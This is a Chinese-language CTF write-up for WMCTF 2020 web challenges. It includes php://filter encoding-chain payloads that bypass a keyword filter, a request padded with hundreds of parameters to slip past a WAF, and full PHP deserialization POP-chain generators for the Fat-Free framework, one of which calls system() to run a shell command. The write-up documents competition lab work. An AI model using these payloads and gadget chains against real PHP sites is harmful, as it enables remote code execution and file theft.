date: 2020-08-04
categories:
- 比赛
tags:
- wp
- web
- ctf
title: wmctf2020
---
# wmctf 2020

u1s1，这次比赛质量很高

## web_checkin

```
<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/' . md5($_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

这题就很简单，因为flag就在/flag，直接包含拿到flag



## web_checkin2

这题就很有意思了，搞了整整一天

一样的代码

```php
<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

这次flag不在/flag，所以我们需要命令执行

因为这个php版本是7.0.33所以`string.strip_tags`这个过滤器不能用，不然的话可以利用这样的payload:`php://filter/write=string.strip_tags|dechunk/resource=%3f>%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b`

为啥不能用嘞，因为7.0.33版本有个bug，用`string.strip_tags`会出现segment fault

后来我就想到了，利用segment fault，php不会删除临时文件，所以就上传文件，然后爆破文件名，但是后来题目弄了个提醒：`no brute force` 心态裂开

于是我们得找其他的方法，

这下彻底没招了，只能去看源代码了，在分析代码的时候发现：

![image1550](https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png)

php会对filter进行urldecode，美滋滋那么payload出来了

payload:

```
php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An
```

但是新的问题出现了，这个网站的中间件会ban`%25`，送出题人一句mmp。

跨过千山万水来到这里，结果还有新的拦路虎。

一般遇到服务器中间件拦截%25的时候，我们可以试试php与中间件对数据解析的差异来绕过，或者试试http请求走私，测试后发现两种都不行

服务器过滤了%25，测试下发现这是是针对参数值的，如把%25放到参数名那里就是很ok的，然后我们就知道他是针对参数检测的，如果参数过多它还能检测吗

于是有：

```
GET /index.php/aaa/?a=&b=&c=&d=&e=&f=&g=&h=&i=&j=&k=&l=&m=&n=&o=&p=&q=&r=&s=&t=&u=&v=&w=&x=&y=&z=&A=&B=&C=&D=&E=&F=&G=&H=&I=&J=&K=&L=&M=&N=&O=&P=&Q=&R=&S=&T=&U=&V=&W=&X=&Y=&Z=&0=&1=&2=&3=&4=&5=&6=&7=&8=&9=&aa=&ab=&ac=&ad=&ae=&af=&ag=&ah=&ai=&aj=&ak=&al=&am=&an=&ao=&ap=&aq=&ar=&as=&at=&au=&av=&aw=&ax=&ay=&az=&aA=&aB=&aC=&aD=&aE=&aF=&aG=&aH=&aI=&aJ=&aK=&aL=&aM=&aN=&aO=&aP=&aQ=&aR=&aS=&aT=&aU=&aV=&aW=&aX=&aY=&aZ=&a0=&a1=&a2=&a3=&a4=&a5=&a6=&a7=&a8=&a9=&ba=&bb=&bc=&bd=&be=&bf=&bg=&bh=&bi=&bj=&bk=&bl=&bm=&bn=&bo=&bp=&bq=&br=&bs=&bt=&bu=&bv=&bw=&bx=&by=&bz=&bA=&bB=&bC=&bD=&bE=&bF=&bG=&bH=&bI=&bJ=&bK=&bL=&bM=&bN=&bO=&bP=&bQ=&bR=&bS=&bT=&bU=&bV=&bW=&bX=&bY=&bZ=&b0=&b1=&b2=&b3=&b4=&b5=&b6=&b7=&b8=&b9=&ca=&cb=&cc=&cd=&ce=&cf=&cg=&ch=&ci=&cj=&ck=&cl=&cm=&cn=&co=&cp=&cq=&cr=&cs=&ct=&cu=&cv=&cw=&cx=&cy=&cz=&cA=&cB=&cC=&cD=&cE=&cF=&cG=&cH=&cI=&content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&cJ=&cK=&cL=&cM=&cN=&cO=&cP=&cQ=&cR=&cS=&cT=&cU=&cV=&cW=&cX=&cY=&cZ=&c0=&c1=&c2=&c3=&c4=&c5=&c6=&c7=&c8=&c9=&da=&db=&dc=&dd=&de=&df=&dg=&dh=&di=&dj=&dk=&dl=&dm=&dn=&do=&dp=&dq=&dr=&ds=&dt=&du=&dv=&dw=&dx=&dy=&dz=&dA=&dB=&dC=&dD=&dE=&dF=&dG=&dH=&dI=&dJ=&dK=&dL=&dM=&dN=&dO=&dP=&dQ=&dR=&dS=&dT=&dU=&dV=&dW=&dX=&dY=&dZ=&d0=&d1=&d2=&d3=&d4=&d5=&d6=&d7=&d8=&d9=&ea=&eb=&ec=&ed=&ee=&ef=&eg=&eh=&ei=&ej=&ek=&el=&em=&en=&eo=&ep=&eq=&er=&es=&et=&eu=&ev=&ew=&ex=&ey=&ez=&eA=&eB=&eC=&eD=&eE=&eF=&eG=&eH=&eI=&eJ=&eK=&eL=&eM=&eN=&eO=&eP=&eQ=&eR=&eS=&eT=&eU=&eV=&eW=&eX=&eY=&eZ=&e0=&e1=&e2=&e3=&e4=&e5=&e6=&e7=&e8=&e9=&fa=&fb=&fc=&fd=&fe=&ff=&fg=&fh=&fi=&fj=&fk=&fl=&fm=&fn=&fo=&fp=&fq=&fr=&fs=&ft=&fu=&fv=&fw=&fx=&fy=&fz=&fA=&fB=&fC=&fD=&fE=&fF=&fG=&fH=&fI=&fJ=&fK=&fL=&fM=&fN=&fO=&fP=&fQ=&fR=&fS=&fT=&fU=&fV=&fW=&fX=&fY=&fZ=&f0=&f1=&f2=&f3=&f4=&f5=&f6=&f7=&f8=&f9=&ga=&gb=&gc=&gd=&ge=&gf=&gg=&gh=&gi=&gj=&gk=&gl=&gm=&gn=&go=&gp=&gq=&gr=&gs=&gt=&gu=&gv=&gw=&gx=&gy=&gz=&gA=&gB=&gC=&gD=&gE=&gF=&gG=&gH=&gI=&gJ=&gK=&gL=&gM=&gN=&gO=&gP=&gQ=&gR=&gS=&gT=&gU=&gV=&gW=&gX=&gY=&gZ=&g0=&g1=&g2=&g3=&g4=&g5=&g6=&g7=&g8=&g9=&ha=&hb=&hc=&hd=&he=&hf=&hg=&hh=&hi=&hj=&hk=&hl=&hm=&hn=&ho=&hp=&hq=&hr=&hs=&ht=&hu=&hv=&hw=&hx=&hy=&hz=&hA=&hB=&hC=&hD=&hE=&hF=&hG=&hH=&hI=&hJ=&hK=&hL=&hM=&hN=&hO=&hP=&hQ=&hR=&hS=&hT=&hU=&hV=&hW=&hX=&hY=&hZ=&h0=&h1=&h2=&h3=&h4=&h5=&h6=&h7=&h8=&h9=&ia=&ib=&ic=&id=&ie=&if=&ig=&ih=&ii=&ij=&ik=&il=&im=&in=&io=&ip=&iq=&ir=&is=&it=&iu=&iv=&iw=&ix=&iy=&iz=&iA=&iB=&iC=&iD=&iE=&iF=&iG=&iH=&iI=&iJ=&iK=&iL=&iM=&iN=&iO=&iP=&iQ=&iR=&iS=&iT=&iU=&iV=&iW=&iX=&iY=&iZ=&i0=&i1=&i2=&i3=&i4=&i5=&i6=&i7=&i8=&i9=&ja=&jb=&jc=&jd=&je=&jf=&jg=&jh=&ji=&jj=&jk=&jl=&jm=&jn=&jo=&jp=&jq=&jr=&js=&jt=&ju=&jv=&jw=&jx=&jy=&jz=&jA=&jB=&jC=&jD=&jE=&jF=&jG=&jH=&jI=&jJ=&jK=&jL=&jM=&jN=&jO=&jP=&jQ=&jR=&jS=&jT=&jU=&jV=&jW=&jX=&jY=&jZ=&j0=&j1=&j2=&j3=&j4=&j5=&j6=&j7=&j8=&j9=&ka=&kb=&kc=&kd=&ke=&kf=&kg=&kh=&ki=&kj=&kk=&kl=&km=&kn=&ko=&kp=&kq=&kr=&ks=&kt=&ku=&kv=&kw=&kx=&ky=&kz=&kA=&kB=&kC=&kD=&kE=&kF=&kG=&kH=&kI=&kJ=&kK=&kL=&kM=&kN=&kO=&kP=&kQ=&kR=&kS=&kT=&kU=&kV=&kW=&kX=&kY=&kZ=&k0=&k1=&k2=&k3=&k4=&k5=&k6=&k7=&k8=&k9=&la=&lb=&lc=&ld=&le=&lf=&lg=&lh=&li=&lj=&lk=&ll=&lm=&ln=&lo=&lp=&lq=&lr=&ls=&lt=&lu=&lv=&lw=&lx=&ly=&lz=&lA=&lB=&lC=&lD=&lE=&lF=&lG=&lH=&lI=&lJ=&lK=&lL=&lM=&lN=&lO=&lP=&lQ=&lR=&lS=&lT=&lU=&lV=&lW=&lX=&lY=&lZ=&l0=&l1=&l2=&l3=&l4=&l5=&l6=&l7=&l8=&l9=&ma=&mb=&mc=&md=&me=&mf=&mg=&mh=&mi=&mj=&mk=&ml=&mm=&mn=&mo=&mp=&mq=&mr=&ms=&mt=&mu=&mv=&mw=&mx=&my=&mz=&mA=&mB=&mC=&mD=&mE=&mF=&mG=&mH=&mI=&mJ=&mK=&mL=&mM=&mN=&mO=&mP=&mQ=&mR=&mS=&mT=&mU=&mV=&mW=&mX=&mY=&mZ=&m0=&m1=&m2=&m3=&m4=&m5=&m6=&m7=&m8=&m9=&na=&nb=&nc=&nd=&ne=&nf=&ng=&nh=&ni=&nj=&nk=&nl=&nm=&nn=&no=&np=&nq=&nr=&ns=&nt=&nu=&nv=&nw=&nx=&ny=&nz=&nA=&nB=&nC=&nD=&nE=&nF=&nG=&nH=&nI=&nJ=&nK=&nL=&nM=&nN=&nO=&nP=&nQ=&nR=&nS=&nT=&nU=&nV=&nW=&nX=&nY=&nZ=&n0=&n1=&n2=&n3=&n4=&n5=&n6=&n7=&n8=&n9=&oa=&ob=&oc=&od=&oe=&of=&og=&oh=&oi=&oj=&ok=&ol=&om=&on=&oo=&op=&oq=&or=&os=&ot=&ou=&ov=&ow=&ox=&oy=&oz=&oA=&oB=&oC=&oD=&oE=&oF=&oG=&oH=&oI=&oJ=&oK=&oL=&oM=&oN=&oO=&oP=&oQ=&oR=&oS=&oT=&oU=&oV=&oW=&oX=&oY=&oZ=&o0=&o1=&o2=&o3=&o4=&o5=&o6=&o7=&o8=&o9=&pa=&pb=&pc=&pd=&pe=&pf=&pg=&ph=&pi=&pj=&pk=&pl=&pm=&pn=&po=&pp=&pq=&pr=&ps=&pt=&pu=&pv=&pw=&px=&py=&pz=&pA=&pB=&pC=&pD=&pE=&pF=&pG=&pH=&pI=&pJ=&pK=&pL=&pM=&pN=&pO=&pP=&pQ=&pR=&pS=&pT=&pU=&pV=&pW=&pX=&pY=&pZ=&p0=&p1=&p2=&p3=&p4=&p5=&p6=&p7=&p8=&p9=&qa=&qb=&qc=&qd=&qe=&qf=&qg=&qh=&qi=&qj=&qk=&ql=&qm=&qn=&qo=&qp=&qq=&qr=&qs=&qt=&qu=&qv=&qw=&qx=&qy=&qz=&qA=&qB=&qC=&qD=&qE=&qF=&qG=&qH=&qI=&qJ=&qK=&qL=&qM=&qN=&qO=&qP=&qQ=&qR=&qS=&qT=&qU=&qV=&qW=&qX=&qY=&qZ=&q0=&q1=&q2=&q3=&q4=&q5=&q6=&q7=&q8=&q9=&ra=&rb=&rc=&rd=&re=&rf=&rg=&rh=&ri=&rj=&rk=&rl=&rm=&rn=&ro=&rp=&rq=&rr=&rs=&rt=&ru=&rv=&rw=&rx=&ry=&rz=&rA=&rB=&rC=&rD=&rE=&rF=&rG=&rH=&rI=&rJ=&rK=&rL=&rM=&rN=&rO=&rP=&rQ=&rR=&rS=&rT=&rU=&rV=&rW=&rX=&rY=&rZ=&r0=&r1=&r2=&r3=&r4=&r5=&r6=&r7=&r8=&r9=&sa=&sb=&sc=&sd=&se=&sf=&sg=&sh=&si=&sj=&sk=&sl=&sm=&sn=&so=&sp=&sq=&sr=&ss=&st=&su=&sv=&sw=&sx=&sy=&sz=&sA=&sB=&sC=&sD=&sE=&sF=&sG=&sH=&sI=&sJ=&sK=&sL=&sM=&sN=&sO=&sP=&sQ=&sR=&sS=&sT=&sU=&sV=&sW=&sX=&sY=&sZ=&s0=&s1=&s2=&s3=&s4=&s5=&s6=&s7=&s8=&s9=&ta=&tb=&tc=&td=&te=&tf=&tg=&th=&ti=&tj=&tk=&tl=&tm=&tn=&to=&tp=&tq=&tr=&ts=&tt=&tu=&tv=&tw=&tx=&ty=&tz=&tA=&tB=&tC=&tD=&tE=&tF=&tG=&tH=&tI=&tJ=&tK=&tL=&tM=&tN=&tO=&tP=&tQ=&tR=&tS=&tT=&tU=&tV=&tW=&tX=&tY=&tZ=&t0=&t1=&t2=&t3=&t4=&t5=&t6=&t7=&t8=&t9=&ua=&ub=&uc=&ud=&ue=&uf=&ug=&uh=&ui=&uj=&uk=&ul=&um=&un=&uo=&up=&uq=&ur=&us=&ut=&uu=&uv=&uw=&ux=&uy=&uz=&uA=&uB=&uC=&uD=&uE=&uF=&uG=&uH=&uI=&uJ=&uK=&uL=&uM=&uN=&uO=&uP=&uQ=&uR=&uS=&uT=&uU=&uV=&uW=&uX=&uY=&uZ=&u0=&u1=&u2=&u3=&u4=&u5=&u6=&u7=&u8=&u9=&va=&vb=&vc=&vd=&ve=&vf=&vg=&vh=&vi=&vj=&vk=&vl=&vm=&vn=&vo=&vp=&vq=&vr=&vs=&vt=&vu=&vv=&vw=&vx=&vy=&vz=&vA=&vB=&vC=&vD=&vE=&vF=&vG=&vH=&vI=&vJ=&vK=&vL=&vM=&vN=&vO=&vP=&vQ=&vR=&vS=&vT=&vU=&vV=&vW=&vX=&vY=&vZ=&v0=&v1=&v2=&v3=&v4=&v5=&v6=&v7=&v8=&v9=&wa=&wb=&wc=&wd=&we=&wf=&wg=&wh=&wi=&wj=&wk=&wl=&wm=&wn=&wo=&wp=&wq=&wr=&ws=&wt=&wu=&wv=&ww=&wx=&wy=&wz=&wA=&wB=&wC=&wD=&wE=&wF=&wG=&wH=&wI=&wJ=&wK=&wL=&wM=&wN=&wO=&wP=&wQ=&wR=&wS=&wT=&wU=&wV=&wW=&wX=&wY=&wZ=&w0=&w1=&w2=&w3=&w4=&w5=&w6=&w7=&w8=&w9=&xa=&xb=&xc=&xd=&xe=&xf=&xg=&xh=&xi=&xj=&xk=&xl=&xm=&xn=&xo=&xp=&xq=&xr=&xs=&xt=&xu=&xv=&xw=&xx=&xy=&xz=&xA=&xB=&xC=&xD=&xE=&xF=&xG=&xH=&xI=&xJ=&xK=&xL=&xM=&xN=&xO=&xP=&xQ=&xR=&xS=&xT=&xU=&xV=&xW=&xX=&xY=&xZ=&x0=&x1=&x2=&x3=&x4=&x5=&x6=&x7=&x8=&x9=&ya=&yb=&yc=&yd=&ye=&yf=&yg=&yh=&yi=&yj=&yk=&yl=&ym=&yn=&yo=&yp=&yq=&yr=&ys=&yt=&yu=&yv=&yw=&yx=&yy=&yz=&yA=&yB=&yC=&yD=&yE=&yF=&yG=&yH=&yI=&yJ=&yK=&yL=&yM=&yN=&yO=&yP=&yQ=&yR=&yS=&yT=&yU=&yV=&yW=&yX=&yY=&yZ=&y0=&y1=&y2=&y3=&y4=&y5=&y6=&y7=&y8=&y9=&za=&zb=&zc=&zd=&ze=&zf=&zg=&zh=&zi=&zj=&zk=&zl=&zm=&zn=&zo=&zp=&zq=&zr=&zs=&zt=&zu=&zv=&zw=&zx=&zy=&zz=&zA=&zB=&zC=&zD=&zE=&zF=&zG=&zH=&zI=&zJ=&zK=&zL=&zM=&zN=&zO=&zP=&zQ=&zR=&zS=&zT=&zU=&zV=&zW=&zX=&zY=&zZ=&z0=&z1=&z2=&z3=&z4=&z5=&z6=&z7=&z8=&z9=&Aa=&Ab=&Ac=&Ad=&Ae=&Af=&Ag=&Ah=&Ai=&Aj=&Ak=&Al=&Am=&An=&Ao=&Ap=&Aq=&Ar=&As=&At=&Au=&Av=&Aw=&Ax=&Ay=&Az=&AA=&AB=&AC=&AD=&AE=&AF=&AG=&AH=&AI=&AJ=&AK=&AL=&AM=&AN=&AO=&AP=&AQ=&AR=&AS=&AT=&AU=&AV=&AW=&AX=&AY=&AZ=&A0=&A1=&A2=&A3=&A4=&A5=&A6=&A7=&A8=&A9=&Ba=&Bb=&Bc=&Bd=&Be=&Bf=&Bg=&Bh=&Bi=&Bj=&Bk=&Bl=&Bm=&Bn=&Bo=&Bp=&Bq=&Br=&Bs=&Bt=&Bu=&Bv=&Bw=&Bx=&By=&Bz=&BA=&BB=&BC=&BD=&BE=&BF=&BG=&BH=&BI=&BJ=&BK=&BL=&BM=&BN=&BO=&BP=&BQ=&BR=&BS=&BT=&BU=&BV=&BW=&BX=&BY=&BZ=&B0=&B1=&B2=&B3=&B4=&B5=&B6=&B7=&B8=&B9=&Ca=&Cb=&Cc=&Cd=&Ce=&Cf=&Cg=&Ch=&Ci=&Cj=&Ck=&Cl=&Cm=&Cn=&Co=&Cp=&Cq=&Cr=&Cs=&Ct=&Cu=&Cv=&Cw=&Cx=&Cy=&Cz=&CA=&CB=&CC=&CD=&CE=&CF=&CG=&CH=&CI=&CJ=&CK=&CL=&CM=&CN=&CO=&CP=&CQ=&CR=&CS=&CT=&CU=&CV=&CW=&CX=&CY=&CZ=&C0=&C1=&C2=&C3=&C4=&C5=&C6=&C7=&C8=&C9=&Da=&Db=&Dc=&Dd=&De=&Df=&Dg=&Dh=&Di=&Dj=&Dk=&Dl=&Dm=&Dn=&Do=&Dp=&Dq=&Dr=&Ds=&Dt=&Du=&Dv=&Dw=&Dx=&Dy=&Dz=&DA=&DB=&DC=&DD=&DE=&DF=&DG=&DH=&DI=&DJ=&DK=&DL=&DM=&DN=&DO=&DP=&DQ=&DR=&DS=&DT=&DU=&DV=&DW=&DX=&DY=&DZ=&D0=&D1=&D2=&D3=&D4=&D5=&D6=&D7=&D8=&D9=&Ea=&Eb=&Ec=&Ed=&Ee=&Ef=&Eg=&Eh=&Ei=&Ej=&Ek=&El=&Em=&En=&Eo=&Ep=&Eq=&Er=&Es=&Et=&Eu=&Ev=&Ew=&Ex=&Ey=&Ez=&EA=&EB=&EC=&ED=&EE=&EF=&EG=&EH=&EI=&EJ=&EK=&EL=&EM=&EN= HTTP/1.1
Host: web_checkin2.wmctf.wetolink.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


```

测试发现，就如我们猜想的一样。

访问`http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An`
拿到flag:`WMCTF{3C5E9715-5BEE-4D33-8627-DE10E5D92715}`

## webweb

这题本地测试成功远程不行，不知道为啥，静等其他人的wp

代码很简单：

```php
<?php

// Kickstart the framework
$f3=require('lib/base.php');

$f3->set('DEBUG',1);
if ((float)PCRE_VERSION<8.0)
	trigger_error('PCRE version is out of date');

// Load configuration
$f3->config('config.ini');

$f3->route('GET /',
	function($f3) {
		echo "just get me a,don't do anything else";
	}
);
unserialize($_GET['a']);

$f3->run();

```

### 任意文件读取

又是一题反序列化

老规矩开局找入口点：

![image11496](https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png)

这里只有这一个入口点，这个入口点还挺不错的。

接下来我们可以考虑调用魔术方法或者是利用`$func($this)`来构造下一步

这里可以利用的魔术方法有：`__get`和`__call`，找了一波没啥好用的魔术方法，那么我们就利用`$func($this)`吧

接下来我们有两种思路：

1. 扩宽道路，就是找一个函数，里面调用有意思的方法的
2. 确定pop链尾

我这里是先扩宽反序列化的道路再去找链尾的，毕竟可以当链尾的太多了

慢慢找过去发现一个有意思的方法

![image11818](https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png)

这里可以调用:`$func($url,false,true)`，如果我们能控制`$url`那么我们就能舒服多了，那么我们接下来就是要找个可以控制`$url`的地方

找着找着发现了`Base::run`这个方法

```php
function run();
```

可以直接利用`$func($this);`来调用它（对于用户自定义的函数/方法，多一些参数没啥影响，但是对大部分自带的函数就不行了，原因估计是自带的函数都是c编写的固定参数的函数），我们来看下它调用`reroute`的地方



![image12152](https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png)



我们可以看到确实`$url`是我们可以控制的，现在就是要让语句执行到这里，这个没啥好说的，有耐心一点慢慢调就ok了，直接换上payload了：



接下来就是需要找到一个合适的函数，本地fuzz自带的函数发现，exec是可以的，虽然它会报错

![image12361](https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png)

amazing，划重点这是要考的，虽然本地可以，但是

![image12473](https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png)

服务器上去测试就segment fault了，黯然离去.jpg

接下来我们只能去找框架的函数了

找着找着我找到了：

![image12618](https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png)

这样一个东西，这个函数就很nice

我们传入`WEB->send('/flag',false,true);`那么我们就能得到`/flag`的内容了

最后payload如下：



```php
<?php

namespace CLI{
    class Agent {
        protected
            $server="",
            $id="",
            $socket="",
            $flag="",
            $verb="",
            $uri="",
            $headers="";
        public $events;
        public function check(){

        }
        public function __construct(){
            $this->events=["disconnect"=>array(new \base(),"run")];
            $this->server=&$this;


        }
    };
    class WS
    {
        protected
            $addr="",
            $ctx="",
            $wait="",
            $sockets="",
            $protocol="",
            $agents = [];
        public $events = ["disconnect"=>"bbbbb"];
        public function __construct($val)
        {
            $this->addr = $val;
        }
    }

}
namespace DB{

    abstract class Cursor  implements \IteratorAggregate {
        protected
            //! Flat-file DB wrapper
            $db,
            //! Data file
            $file,
            //! Document identifier
            $id,
            //! Document contents
            $document=[],
            //! field map-reduce handlers
            $_reduce;
    }
}
namespace DB\Jig{

    use Traversable;

    class Mapper extends \DB\Cursor{
        protected
            //! Flat-file DB wrapper
            $db,
            //! Data file
            $file,
            //! Document identifier
            $id,
            //! Document contents
            $document=[],
            //! field map-reduce handlers
            $_reduce;
        public function __construct(){
            $this->db = new \base();
            $this->file = "index.php";
        }

        public function getIterator()
        {
            // TODO: Implement getIterator() method.
        }
        function exists($key)
        {
            // TODO: Implement exists() method.
        }

        function set($key, $val)
        {
            // TODO: Implement set() method.
        }

        function get($key)
        {
            // TODO: Implement get() method.
        }

        function clear($key)
        {
            // TODO: Implement clear() method.
        }

        public function offsetExists($offset)
        {
            // TODO: Implement offsetExists() method.
        }

        public function offsetGet($offset)
        {
            // TODO: Implement offsetGet() method.
        }

        public function offsetSet($offset, $value)
        {
            // TODO: Implement offsetSet() method.
        }
        public function offsetUnset($offset)
        {
            // TODO: Implement offsetUnset() method.
        }
    }
}

namespace {
    abstract class Prefab {
        static function instance() {
            if (!Registry::exists($class=get_called_class())) {
                $ref=new ReflectionClass($class);
                $args=func_get_args();
                Registry::set($class,
                    $args?$ref->newinstanceargs($args):new $class);
            }
            return Registry::get($class);
        }

    }
    final class Base extends Prefab implements ArrayAccess{
        private
            $hive,
            $init,
            $languages,
            $locks=[],
            $fallback='en';
        public function __construct(){
            $this->hive=[
                "ROUTES"=>['/flag/'=>[['GET'=>1]],"2"=>1],
                "PATH"=>'/flag/',#$url
                "QUERY"=>"",
                "VERB"=>"GET",
                "PARAMS"=>[],
                "ONREROUTE"=>"WEB->send",#$func
                "CLI"=>'123'
                ];
        }

        public function offsetExists($offset)
        {
        }
        public function offsetGet($offset)
        {
        }

        public function offsetSet($offset, $value)
        {
            // TODO: Implement offsetSet() method.
        }

        public function offsetUnset($offset)
        {
            // TODO: Implement offsetUnset() method.
        }
    }
    abstract class Magic implements \ArrayAccess{

    }

    echo urlencode(serialize(new \CLI\WS(new \CLI\Agent())));
}
```

![image16897](https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png)

然而在题目中它虽然执行了`WEB->send`方法（根据错误信息得知），但是并不会返回`/flag`（所有文件都读不了），希望有看到的师傅给个解答



### 正解

果然是我一句魔术方法里面没啥好用的这一句话断送了我的flag，有这样一个魔术方法

![image17108](https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png)

它通过控制`$this->props`我们可以调用任意函数，那么我们只需要找到一个可控参数的位置就可以了

找到

![image17250](https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png)

构造payload

```php
<?php
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
}


namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected
            $props=["quotekey"=>"system"],
            $adhoc=["ls -al"=>["expr"=>""]],
            $db;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        function __construct($val){
            $this->db = $val;
        }
    }
}
namespace CLI{
    class Agent {
        protected
            $server="";
        public $events;
        public function __construct(){
            $this->events=["disconnect"=>array(new \DB\SQL\Mapper(new \DB\SQL\Mapper("")),"find")];
            $this->server=&$this;


        }
    };
    class WS{}
}
namespace {
    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
}
```



##  Make PHP Great Again  &&  Make PHP Great Again 2.0

这题是学长闲的无聊解出来的，说10分钟就ok的题目。。。膜拜

![image18383](https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png)

实际调试的时候是这样的：

![image18481](https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png)

上面还有一堆tsrm_realpath_r。

还有啥好说的？看代码。。。。

